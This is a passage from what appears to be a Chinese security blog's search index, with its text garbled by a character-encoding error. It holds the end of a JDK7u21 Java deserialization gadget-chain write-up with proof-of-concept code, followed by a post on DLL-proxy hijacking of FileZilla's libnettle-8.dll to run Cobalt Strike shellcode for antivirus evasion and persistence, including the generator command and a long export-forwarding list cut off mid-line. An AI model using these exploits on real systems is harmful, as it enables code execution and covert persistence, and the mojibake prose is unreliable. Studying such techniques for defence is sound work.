//é€šè¿‡åå°„åˆ›å»ºä»£ç†ä½¿ç”¨çš„handlerï¼ŒAnnotationInvocationHandlerä½œä¸ºåŠ¨æ€ä»£ç†çš„handler Constructor ctor = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0]; ctor.setAccessible(true); InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map); Templates proxy = (Templates) Proxy.newProxyInstance(Myjdk7u21.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler); LinkedHashSet set = new LinkedHashSet(); set.add(templates); set.add(proxy); map.put(&quot;f5a5a608&quot;, templates); byte[] obj=serialize(set); unserialize(obj); }} ååºåˆ—åŒ–LinkedHashSetç±»å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚ Javaåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨ObjectInputStreamç±»çš„readObject()æ–¹æ³•ï¼Œå¦‚æœè¢«ååºåˆ—åŒ–çš„ç±»é‡å†™äº†readObject()ï¼Œé‚£ä¹ˆè¯¥ç±»åœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼ŒJavaä¼šä¼˜å…ˆè°ƒç”¨é‡å†™çš„readObject()æ–¹æ³•ã€‚ LinkedHashSetç±»æ²¡æœ‰readObject()ï¼Œä½†æ˜¯å®ƒçš„çˆ¶ç±»HashSetå­˜åœ¨readObject()ï¼Œä¸¤è€…éƒ½ç»§æ‰¿äº†Serializableæ¥å£ readObject()ä¸­æŠŠTemplateså’ŒproxyåŠ å…¥åˆ°map è¿›å…¥put()ï¼Œ è¿™é‡Œä¼šå’Œä¸Šä¸€ä¸ª Entry çš„ Key (templates) è¿›è¡Œæ¯”è¾ƒï¼Œåˆ¤æ–­è¿™ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœç›¸ç­‰åˆ™æ–°çš„æ›¿æ¢è€çš„å€¼ï¼Œç„¶åè¿”å›è€çš„å€¼ã€‚ å…³é”®ç‚¹åœ¨äºkey.equals(k)ï¼Œæ·»åŠ çš„é¡ºåºæ˜¯ï¼Œå‰ä¸€ä¸ªä¸º templates åä¸€ä¸ªä¸ºproxyã€‚ è¦åˆ°è¾¾key.equals(k)éœ€è¦å…ˆæ»¡è¶³æ¡ä»¶e.hash == hashï¼Œä¹Ÿå°±æ˜¯æ»¡è¶³hash(templates)== hash(proxy)ï¼Œè¿™ä¸ªæ¡ä»¶ä¸‹é¢å†è¯´ æ ¹æ®||çš„è§„åˆ™ï¼Œç¬¬ä¸€ä¸ªå€¼ä¸ºfalseæ—¶æ‰èƒ½è¿›å…¥ç¬¬äºŒä¸ªã€‚æ­¤æ—¶ï¼Œkeyç­‰äºproxyï¼Œe.keyç­‰äºtemplatesç±»ï¼Œè¿™æ ·(k = e.key) == keyè¿”å›falseã€‚è¿›å…¥key.equals(k) ç”±äºä½¿ç”¨äº†åŠ¨æ€ä»£ç†ï¼Œè°ƒç”¨Templates.equals()å°±ä¼šè¿›å…¥AnnotaionlnvocationHandlerçš„invoke()ï¼Œç„¶åå› ä¸ºæ»¡è¶³ifæ¡ä»¶è¿›å…¥equalsImplã€‚ è¿™é‡Œçš„ 123var1ä¸ºå½“å‰proxyä»£ç†å®ä¾‹å¯¹è±¡ï¼Œç­‰äºä¹‹å‰çš„keyvar2ä¸ºå½“å‰è°ƒç”¨æ–¹æ³•ï¼Œç­‰äºequalsæ–¹æ³•å¯¹è±¡var3ä¸ºå½“å‰è°ƒç”¨æ–¹æ³•çš„ä¼ å…¥å‚æ•°åˆ—è¡¨ï¼Œç­‰äºTemplatesImplç±»ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰çš„kå’Œe.key sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl è¿›å…¥equalsImpl()ï¼Œå‰ä¸¤ä¸ªæ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œè¿›å…¥getMemberMethods sun.reflect.annotation.AnnotationInvocationHandler#getMemberMethods æ»¡è¶³æ¡ä»¶this.memberMethodsï¼Œthis.typeç­‰äºTemplatesï¼Œè¿™æ ·å°±ä¼šè¿”å›Templatesä¸­çš„æ‰€æœ‰æ–¹æ³•ï¼ŒåŒ…æ‹¬getOutputProperties() å›åˆ°equalsImplï¼Œè¿™é‡Œä¼šè·å–this.typeç±»ä¸­æ‰€æœ‰çš„æ–¹æ³•ï¼Œç„¶åéå†å¹¶è°ƒç”¨æ¯ä¸€ä¸ªæ–¹æ³•ã€‚è¿™é‡Œè®©this.typeç­‰äºTemplatesæ¥å£å°±å¯ä»¥è°ƒç”¨Templatesä¸­çš„æ‰€æœ‰æ–¹æ³•ï¼ŒåŒ…æ‹¬getOutputProperties()ï¼Œè§¦å‘payload 1234567891011121314151617181920212223242526272829303132333435private Boolean equalsImpl(Object var1) {//var1ç­‰äºæ„é€ å¥½çš„templates if (var1 == this) { return true; } else if (!this.type.isInstance(var1)) { return false; } else { Method[] var2 = this.getMemberMethods();//var2ä¸ºTemplatesçš„æ‰€æœ‰æ–¹æ³• int var3 = var2.length;//var3ä¸ºTemplatesæ–¹æ³•çš„æ•°é‡ for(int var4 = 0; var4 &lt; var3; ++var4) {//è¿­ä»£Templatesçš„æ‰€æœ‰æ–¹æ³• Method var5 = var2[var4];//var5ä¸ºTemplatesçš„ä¸­çš„æŸä¸ªæ–¹æ³• String var6 = var5.getName();//var6ä¸ºè¯¥æ–¹æ³•çš„åç§° Object var7 = this.memberValues.get(var6);//åœ¨memberValuesä¸­è·å–keyä¸ºvar6çš„å€¼ï¼Œä½†memberValuesåªæœ‰ä¸€ä¸ªkeyä¸ºf5a5a608çš„é”®å€¼å¯¹ï¼Œæ‰€ä»¥var7ä¸ºnull Object var8 = null; AnnotationInvocationHandler var9 = this.asOneOfUs(var1);//var9ä¹Ÿä¸ºnull if (var9 != null) { var8 = var9.memberValues.get(var6); } else { try { var8 = var5.invoke(var1);//è¿è¡Œä¼šåˆ°è¿™é‡Œï¼Œæ‰€ä»¥ä¼šè°ƒç”¨Templatesä¸­çš„æ‰€æœ‰æ–¹æ³• } catch (InvocationTargetException var11) { return false; } catch (IllegalAccessException var12) { throw new AssertionError(var12); } } if (!memberValueEquals(var7, var8)) { return false; } } return true; }} æ‰§è¡ŒæˆåŠŸ Hashç»•è¿‡java.util.HashMap#put æ¡ä»¶e.hash == hashï¼Œä¹Ÿå°±æ˜¯æ»¡è¶³hash(templates)== hash(proxy) è°ƒç”¨äº†hash() java.util.HashMap#hash è¿›å…¥hash()å‡½æ•°ï¼Œè¿™é‡Œè°ƒç”¨äº†ä¼ å…¥å¯¹è±¡kçš„hashCode()æ–¹æ³•ï¼Œæ„å‘³ç€æœ‰å¯èƒ½æ§åˆ¶hashå€¼ï¼Œè¿™é‡Œçš„kä¸ºåˆ›å»ºçš„ä»£ç†å®ä¾‹å¯¹è±¡ã€‚æ¥ç€è°ƒç”¨äº†hashCode å› ä¸ºä½¿ç”¨äº†åŠ¨æ€ä»£ç†ï¼Œè°ƒç”¨hash(proxy)æ—¶ä¼šè‡ªåŠ¨è·³è½¬åˆ°AnnotationInvocationHandler.invoke() sun.reflect.annotation.AnnotationInvocationHandler#invoke sun.reflect.annotation.AnnotationInvocationHandler#hashCodeImpl 1234567891011121314151617private int hashCodeImpl() { int var1 = 0; Entry var3; //this.memberValuesç”±æ„é€ å‡½æ•°ä¼ å…¥çš„ï¼Œå¯ä»¥æ§åˆ¶ï¼Œç­‰äºmap Iterator var2 = this.memberValues.entrySet().iterator();//è·å–éå†å™¨ for( ;var2.hasNext(); ) { var3 = (Entry)var2.next(); String key = var3.getKey();//ï¼ˆå¯æ§mapçš„é”®ï¼‰ Object value = var3.getValue()ï¼›//ï¼ˆå¯æ§mapçš„å€¼ï¼‰ var1 += 127 * key.hashCode() ^ //å¯æ§mapçš„é”® çš„ hashCode memberValueHashCode(value); //å¯æ§mapçš„å€¼çš„ hashCode } return var1; } sun.reflect.annotation.AnnotationInvocationHandler#memberValueHashCode 12345private static int memberValueHashCode(Object var0) { Class var1 = var0.getClass(); if (!var1.isArray()) {//ä¸æ˜¯æ•°ç»„çš„è¯è·å–ä¼ å…¥å€¼çš„hashCodeã€‚ return var0.hashCode(); //è¿”å›var0è¿™ä¸ªå¯¹è±¡çš„hashCode ... å®é™…æ‰§è¡Œ Proxyçš„hashCode = 127 * å¯æ§é”®çš„hashCode ^ å¯æ§å€¼çš„hashCode == TemplatesImplçš„hashCode åªè¦è®©å¯æ§é”®çš„hashCodeä¸º0å³å¯ï¼Œåˆ©ç”¨f5a5a608çš„hashcodeä¸º0ï¼Œå­—ç¬¦ä¸²çš„hashcodeä¹Ÿä¸º0ï¼Œåœ¨POCä¸­æ„é€ map.put(&quot;f5a5a608&quot;, templates), è¿™æ · 12var1 = 127 * 0 ^ templatesçš„hashCodevar1 = templatesçš„hashCode map.putjava.util.HashSet#add payloadä¸­æŠŠmap.put(&quot;f5a5a608&quot;, templates)æ”¾åœ¨æœ€åï¼Œè¿™æ˜¯å› ä¸ºaddæ–¹æ³•ä¸­è°ƒç”¨äº†map.putï¼Œå¦‚æœæ”¾åœ¨å‰é¢å°±ä¼šæ»¡è¶³æ¡ä»¶ç›´æ¥åœ¨æœ¬åœ°è§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œç»è¿‡åºåˆ—åŒ–ä¹‹åçš„æ•°æ®ä¸èƒ½ååºåˆ—åŒ–æˆåŠŸã€‚","link":"/2021/04/24/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"DLLä»£ç†åŠ è½½shellcodeå®è·µ","text":"åœ¨ç¨‹åºå¼€å‘è¿‡ç¨‹ä¸­å¾€å¾€ä¼šä½¿ç”¨ç¬¬ä¸‰æ–¹åº“ï¼Œå¤§å¤šæ•°ç¬¬ä¸‰æ–¹åº“ä¼šæä¾›DLL(åŠ¨æ€é“¾æ¥åº“)æ–‡ä»¶ï¼Œå› æ­¤ç¨‹åºéœ€è¦ç›¸åº”çš„DLLæ–‡ä»¶æ‰èƒ½å¯åŠ¨ï¼Œé€šè¿‡Dllä»£ç†å°†æ­£å¸¸dllæ›¿æ¢ä¸ºæ¬¸ä¸€dllï¼Œå¯ä»¥è¿›è¡Œå…æ€æˆ–æƒé™ç»´æŒ æ‰¾å‡ºè¿è¡Œå¿…é¡»çš„dllæ–‡ä»¶ä¾ç…§DLLä»£ç†åŠ è½½shellcodç”¨äºå…æ€ï¼Œç»´æƒç­‰ç­‰ä¸­çš„ä¾‹å­ä¸‹è½½Filezillaï¼Œå°†fzsftp.exeæ”¾åˆ°å•ç‹¬æ–‡ä»¶å¤¹è¿è¡Œï¼Œæ‰¾åˆ°è¿è¡Œå¿…é¡»çš„libnettle-8.dllæ–‡ä»¶ ç¼–è¯‘SharpDllProxyä¸‹è½½SharpDllProxyåç”¨Visual Stuio 2019æ‰“å¼€SharpDllProxy.sln ç¼–è¯‘ç”ŸæˆSharpDllProxy.exe ç”Ÿæˆä»£ç†DllæŒ‡å®šç›®æ ‡dllæ–‡ä»¶åç”Ÿæˆlibnettle-8_pragma.cå’Œtmp2BF5.dllï¼Œpayload.binä¸ºcsç”Ÿæˆçš„rawæ ¼å¼shellcodeã€‚ 1sharpdllproxy.exe --dll E:\\dllproxy\\libnettle-8.dll --payload E:\\dllproxy\\payload.bin åœ¨vsä¸­æ–°å»ºåŠ¨æ€é“¾æ¥åº“å°†ç”Ÿæˆçš„libnettle-8_pragma.cä»£ç å¤åˆ¶åç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œshellcodeçš„åŒådllæ–‡ä»¶ç”¨ä»¥é¡¶æ›¿åŸæœ‰çš„libnettle-8.dllæ–‡ä»¶ æˆåŠŸæ‰§è¡Œshellcodeéœ€è¦4ä¸ªæ–‡ä»¶,fzsftp.exeè°ƒç”¨æ›¿æ¢åçš„æ¶æ„libnettle-8.dllæ–‡ä»¶åä»payload.binä¸­è¯»å–shellcodeåæ‰§è¡Œï¼Œtmp2BF5.dllå³åŸæ¥æ­£å¸¸çš„libnettle-8.dllæ–‡ä»¶ï¼Œä¿è¯ç¨‹åºæ­£å¸¸è¿è¡Œ æ‰§è¡ŒåcsæˆåŠŸä¸Šçº¿ åŸç†åˆ†æç”¨vsæ‰“å¼€libnettle-8_pragma.cåæŸ¥çœ‹ä»£ç ï¼Œå¼€å¤´è°ƒç”¨äº†400å¤šä¸ªtmp2BF5.dllä¸­çš„å‡½æ•°ä»¥ä¿è¯æ–‡ä»¶çš„æ­£å¸¸è¿è¡Œ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546#include &quot;pch.h&quot;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define _CRT_SECURE_NO_DEPRECATE#pragma warning (disable : 4996)#pragma comment(linker, &quot;/export:_nettle_aeads=tmp2BF5._nettle_aeads,@1&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_decrypt=tmp2BF5._nettle_aes_decrypt,@2&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_decrypt_aesni=tmp2BF5._nettle_aes_decrypt_aesni,@3&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_decrypt_x86_64=tmp2BF5._nettle_aes_decrypt_x86_64,@4&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt=tmp2BF5._nettle_aes_encrypt,@5&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt_aesni=tmp2BF5._nettle_aes_encrypt_aesni,@6&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt_table=tmp2BF5._nettle_aes_encrypt_table,@7&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_encrypt_x86_64=tmp2BF5._nettle_aes_encrypt_x86_64,@8&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_invert=tmp2BF5._nettle_aes_invert,@9&quot;)#pragma comment(linker, &quot;/export:_nettle_aes_set_key=tmp2BF5._nettle_aes_set_key,@10&quot;)#pragma comment(linker, &quot;/export:_nettle_armors=tmp2BF5._nettle_armors,@11&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_absorb=tmp2BF5._nettle_camellia_absorb,@12&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_crypt=tmp2BF5._nettle_camellia_crypt,@13&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_invert_key=tmp2BF5._nettle_camellia_invert_key,@14&quot;)#pragma comment(linker, &quot;/export:_nettle_camellia_table=tmp2BF5._nettle_camellia_table,@15&quot;)#pragma comment(linker, &quot;/export:_nettle_chacha_core=tmp2BF5._nettle_chacha_core,@16&quot;)#pragma comment(linker, &quot;/export:_nettle_ciphers=tmp2BF5._nettle_ciphers,@17&quot;)#pragma comment(linker, &quot;/export:_nettle_cpuid=tmp2BF5._nettle_cpuid,@18&quot;)#pragma comment(linker, &quot;/export:_nettle_ctr_crypt16=tmp2BF5._nettle_ctr_crypt16,@19&quot;)#pragma comment(linker, &quot;/export:_nettle_gcm_hash8=tmp2BF5._nettle_gcm_hash8,@20&quot;)#pragma comment(linker, &quot;/export:_nettle_gost28147_encrypt_block=tmp2BF5._nettle_gost28147_encrypt_block,@21&quot;)#pragma comment(linker, &quot;/export:_nettle_gost28147_param_CryptoPro_3411=tmp2BF5._nettle_gost28147_param_CryptoPro_3411,@22&quot;)#pragma comment(linker, &quot;/export:_nettle_gost28147_param_test_3411=tmp2BF5._nettle_gost28147_param_test_3411,@23&quot;)#pragma comment(linker, &quot;/export:_nettle_hashes=tmp2BF5._nettle_hashes,@24&quot;)#pragma comment(linker, &quot;/export:_nettle_macs=tmp2BF5._nettle_macs,@25&quot;)#pragma comment(linker, &quot;/export:_nettle_memxor_sse2=tmp2BF5._nettle_memxor_sse2,@26&quot;)#pragma comment(linker, &quot;/export:_nettle_memxor_x86_64=tmp2BF5._nettle_memxor_x86_64,@27&quot;)#pragma comment(linker, &quot;/export:_nettle_poly1305_block=tmp2BF5._nettle_poly1305_block,@28&quot;)#pragma comment(linker, &quot;/export:_nettle_poly1305_digest=tmp2BF5._nettle_poly1305_digest,@29&quot;)#pragma comment(linker, &quot;/export:_nettle_poly1305_set_key=tmp2BF5._nettle_poly1305_set_key,@30&quot;)#pragma comment(linker, &quot;/export:_nettle_ripemd160_compress=tmp2BF5._nettle_ripemd160_compress,@31&quot;)#pragma comment(linker, &quot;/export:_nettle_salsa20_core=tmp2BF5._nettle_salsa20_core,@32&quot;)#pragma comment(linker, &quot;/export:_nettle_sha1_compress_sha_ni=tmp2BF5._nettle_sha1_compress_sha_ni,@33&quot;)#pragma comment(linker, &quot;/export:_nettle_sha1_compress_x86_64=tmp2BF5._nettle_sha1_compress_x86_64,@34&quot;)#pragma comment(linker, &quot;/export:_nettle_sha256_compress=tmp2BF5._nettle_sha256_compress,@35&quot;)#pragma comment(linker, &quot;/export:_nettle_sha256_compress_sha_ni=tmp2BF5._nettle_sha256_compress_sha_ni,@36&quot;)#pragma comment(linker, &quot;/export:_nettle_sha256_compress_x86_64=tmp2BF5._nettle_sha256_compress_x86_64,@37&quot;)#pragma comment(linker, &quot;/export:_nettle_sha3_pad=tmp2BF5._nettle_sha3_pad,@38&quot;)#pragma comment(linker, &quot;/export:_nettle_sha3_update=tmp2BF5._nettle_sha3_update,@39&quot;)#pragma comment(linker, &quot;/export:_nettle_sha512_compress=tmp2BF5._nettle_sha512_compress,@40&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l2=tmp2BF5._nettle_umac_l2,@41&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l2_final=tmp2BF5._nettle_umac_l2_final,@42&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l2_init=tmp2BF5._nettle_umac_l2_init,@43&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l3=tmp2BF5._nettle_umac_l3,@44&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_l3_init=tmp2BF5._nettle_umac_l3_init,@45&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_nh=tmp2BF5._nettle_umac_nh,@46&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_nh_n=tmp2BF5._nettle_umac_nh_n,@47&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_poly128=tmp2BF5._nettle_umac_poly128,@48&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_poly64=tmp2BF5._nettle_umac_poly64,@49&quot;)#pragma comment(linker, &quot;/export:_nettle_umac_set_key=tmp2BF5._nettle_umac_set_key,@50&quot;)#pragma comment(linker, &quot;/export:_nettle_write_be32=tmp2BF5._nettle_write_be32,@51&quot;)#pragma comment(linker, &quot;/export:_nettle_write_le32=tmp2BF5._nettle_write_le32,@52&quot;)#pragma comment(linker, &quot;/export:_nettle_write_le64=tmp2BF5._nettle_write_le64,@53&quot;)#pragma comment(linker, &quot;/export:nettle_MD5Final=tmp2BF5.nettle_MD5Final,@54&quot;)#pragma comment(linker, &quot;/export:nettle_MD5Init=tmp2BF5.nettle_MD5Init,@55&quot;)#pragma comment(linker, &quot;/export:nettle_MD5Update=tmp2BF5.nettle_MD5Update,@56&quot;)#pragma comment(linker, &quot;/export:nettle_aes128=tmp2BF5.nettle_aes128,@57&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_decrypt=tmp2BF5.nettle_aes128_decrypt,@58&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_encrypt=tmp2BF5.nettle_aes128_encrypt,@59&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_invert_key=tmp2BF5.nettle_aes128_invert_key,@60&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_set_decrypt_key=tmp2BF5.nettle_aes128_set_decrypt_key,@61&quot;)#pragma comment(linker, &quot;/export:nettle_aes128_set_encrypt_key=tmp2BF5.nettle_aes128_set_encrypt_key,@62&quot;)#pragma comment(linker, &quot;/export:nettle_aes192=tmp2BF5.nettle_aes192,@63&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_decrypt=tmp2BF5.nettle_aes192_decrypt,@64&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_encrypt=tmp2BF5.nettle_aes192_encrypt,@65&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_invert_key=tmp2BF5.nettle_aes192_invert_key,@66&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_set_decrypt_key=tmp2BF5.nettle_aes192_set_decrypt_key,@67&quot;)#pragma comment(linker, &quot;/export:nettle_aes192_set_encrypt_key=tmp2BF5.nettle_aes192_set_encrypt_key,@68&quot;)#pragma comment(linker, &quot;/export:nettle_aes256=tmp2BF5.nettle_aes256,@69&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_decrypt=tmp2BF5.nettle_aes256_decrypt,@70&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_encrypt=tmp2BF5.nettle_aes256_encrypt,@71&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_invert_key=tmp2BF5.nettle_aes256_invert_key,@72&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_set_decrypt_key=tmp2BF5.nettle_aes256_set_decrypt_key,@73&quot;)#pragma comment(linker, &quot;/export:nettle_aes256_set_encrypt_key=tmp2BF5.nettle_aes256_set_encrypt_key,@74&quot;)#pragma comment(linker, &quot;/export:nettle_aes_decrypt=tmp2BF5.nettle_aes_decrypt,@75&quot;)#pragma comment(linker, &quot;/export:nettle_aes_encrypt=tmp2BF5.nettle_aes_encrypt,@76&quot;)#pragma comment(linker, &quot;/export:nettle_aes_invert_key=tmp2BF5.nettle_aes_invert_key,@77&quot;)#pragma comment(linker, &quot;/export:nettle_aes_set_decrypt_key=tmp2BF5.nettle_aes_set_decrypt_key,@78&quot;)#pragma comment(linker, &quot;/export:nettle_aes_set_encrypt_key=tmp2BF5.nettle_aes_set_encrypt_key,@79&quot;)#pragma comment(linker, &quot;/export:nettle_arcfour128_set_key=tmp2BF5.nettle_arcfour128_set_key,@80&quot;)#pragma comment(linker, &quot;/export:nettle_arcfour_crypt=tmp2BF5.nettle_arcfour_crypt,@81&quot;)#pragma comment(linker, &quot;/export:nettle_arcfour_set_key=tmp2BF5.nettle_arcfour_set_key,@82&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo128=tmp2BF5.nettle_arctwo128,@83&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo128_set_key=tmp2BF5.nettle_arctwo128_set_key,@84&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo128_set_key_gutmann=tmp2BF5.nettle_arctwo128_set_key_gutmann,@85&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo40=tmp2BF5.nettle_arctwo40,@86&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo40_set_key=tmp2BF5.nettle_arctwo40_set_key,@87&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo64=tmp2BF5.nettle_arctwo64,@88&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo64_set_key=tmp2BF5.nettle_arctwo64_set_key,@89&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_decrypt=tmp2BF5.nettle_arctwo_decrypt,@90&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_encrypt=tmp2BF5.nettle_arctwo_encrypt,@91&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_gutmann128=tmp2BF5.nettle_arctwo_gutmann128,@92&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_set_key=tmp2BF5.nettle_arctwo_set_key,@93&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_set_key_ekb=tmp2BF5.nettle_arctwo_set_key_ekb,@94&quot;)#pragma comment(linker, &quot;/export:nettle_arctwo_set_key_gutmann=tmp2BF5.nettle_arctwo_set_key_gutmann,@95&quot;)#pragma comment(linker, &quot;/export:nettle_base16=tmp2BF5.nettle_base16,@96&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_final=tmp2BF5.nettle_base16_decode_final,@97&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_init=tmp2BF5.nettle_base16_decode_init,@98&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_single=tmp2BF5.nettle_base16_decode_single,@99&quot;)#pragma comment(linker, &quot;/export:nettle_base16_decode_update=tmp2BF5.nettle_base16_decode_update,@100&quot;)#pragma comment(linker, &quot;/export:nettle_base16_encode_single=tmp2BF5.nettle_base16_encode_single,@101&quot;)#pragma comment(linker, &quot;/export:nettle_base16_encode_update=tmp2BF5.nettle_base16_encode_update,@102&quot;)#pragma comment(linker, &quot;/export:nettle_base64=tmp2BF5.nettle_base64,@103&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_final=tmp2BF5.nettle_base64_decode_final,@104&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_init=tmp2BF5.nettle_base64_decode_init,@105&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_single=tmp2BF5.nettle_base64_decode_single,@106&quot;)#pragma comment(linker, &quot;/export:nettle_base64_decode_update=tmp2BF5.nettle_base64_decode_update,@107&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_final=tmp2BF5.nettle_base64_encode_final,@108&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_group=tmp2BF5.nettle_base64_encode_group,@109&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_init=tmp2BF5.nettle_base64_encode_init,@110&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_raw=tmp2BF5.nettle_base64_encode_raw,@111&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_single=tmp2BF5.nettle_base64_encode_single,@112&quot;)#pragma comment(linker, &quot;/export:nettle_base64_encode_update=tmp2BF5.nettle_base64_encode_update,@113&quot;)#pragma comment(linker, &quot;/export:nettle_base64url=tmp2BF5.nettle_base64url,@114&quot;)#pragma comment(linker, &quot;/export:nettle_base64url_decode_init=tmp2BF5.nettle_base64url_decode_init,@115&quot;)#pragma comment(linker, &quot;/export:nettle_base64url_encode_init=tmp2BF5.nettle_base64url_encode_init,@116&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish128_set_key=tmp2BF5.nettle_blowfish128_set_key,@117&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish_decrypt=tmp2BF5.nettle_blowfish_decrypt,@118&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish_encrypt=tmp2BF5.nettle_blowfish_encrypt,@119&quot;)#pragma comment(linker, &quot;/export:nettle_blowfish_set_key=tmp2BF5.nettle_blowfish_set_key,@120&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_clear=tmp2BF5.nettle_buffer_clear,@121&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_copy=tmp2BF5.nettle_buffer_copy,@122&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_grow=tmp2BF5.nettle_buffer_grow,@123&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_init=tmp2BF5.nettle_buffer_init,@124&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_init_realloc=tmp2BF5.nettle_buffer_init_realloc,@125&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_init_size=tmp2BF5.nettle_buffer_init_size,@126&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_reset=tmp2BF5.nettle_buffer_reset,@127&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_space=tmp2BF5.nettle_buffer_space,@128&quot;)#pragma comment(linker, &quot;/export:nettle_buffer_write=tmp2BF5.nettle_buffer_write,@129&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128=tmp2BF5.nettle_camellia128,@130&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128_crypt=tmp2BF5.nettle_camellia128_crypt,@131&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128_invert_key=tmp2BF5.nettle_camellia128_invert_key,@132&quot;)#pragma comment(linker, &quot;/export:nettle_camellia128_set_encrypt_key=tmp2BF5.nettle_camellia128_set_encrypt_key,@133&quot;)#pragma comment(linker, &quot;/export:nettle_camellia192=tmp2BF5.nettle_camellia192,@134&quot;)#pragma comment(linker, &quot;/export:nettle_camellia192_set_decrypt_key=tmp2BF5.nettle_camellia192_set_decrypt_key,@135&quot;)#pragma comment(linker, &quot;/export:nettle_camellia192_set_encrypt_key=tmp2BF5.nettle_camellia192_set_encrypt_key,@136&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256=tmp2BF5.nettle_camellia256,@137&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256_crypt=tmp2BF5.nettle_camellia256_crypt,@138&quot;)#pragma comment(linker, &quot;/export:nettle_camellia256_invert_key=tmp2BF5.nettle_camellia256_invert_key,@139&quot;)#pragma comment(linker, 